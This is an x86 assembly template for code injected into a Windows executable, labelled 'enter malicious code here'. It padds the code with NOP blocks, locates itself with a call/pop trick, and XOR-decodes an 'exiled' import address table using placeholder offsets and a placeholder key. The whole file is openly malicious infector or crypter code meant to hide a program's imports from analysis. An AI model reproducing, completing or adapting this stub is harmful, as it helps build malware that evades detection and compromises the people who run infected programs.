global _start
  
section .text

_start:
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    
; -------------------------------------------
; enter malicious code here
; -------------------------------------------

; <OFFSET_TO_ORIGINAL_IAT> - offset from current decoder to first byte of original IAT
; <OFFSET_TO_EXILED_IAT>   - offset from current decoder to first byte of exiled IAT
; <DECODER_KEY>            - decoder key
; <IAT_SIZE>               - size of IAT
    
    call    get_current_addr                ; push return address
    
get_current_addr:
    pop     esi                             ; pop current address
    sub     esi, 0x5                        ; esi = address of injected code, 0x5 = size of call instruction
    mov     edi, esi                        ; edi = address of injected code
    sub     esi, <OFFSET_TO_ORIGINAL_IAT>   ; esi = address of original IAT
    add     edi, <OFFSET_TO_EXILED_IAT>     ; edi = address of exiled IAT
    
    xor     ebx, ebx                        ; clear registers
    xor     ecx, ecx                        ;
    
    mov     bl,  <DECODER_KEY>              ; decoder key
    mov     ecx, <IAT_SIZE>                 ; encoded code size

decoder_loop:
    mov     edx, esi                        ; construct encoded byte address
    add     edx, ecx                        ;
    dec     edx                             ;
    xor     byte [edx], bl                  ; decode
    loop    decoder_loop                    ; loop back
    

    
; -------------------------------------------
    
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop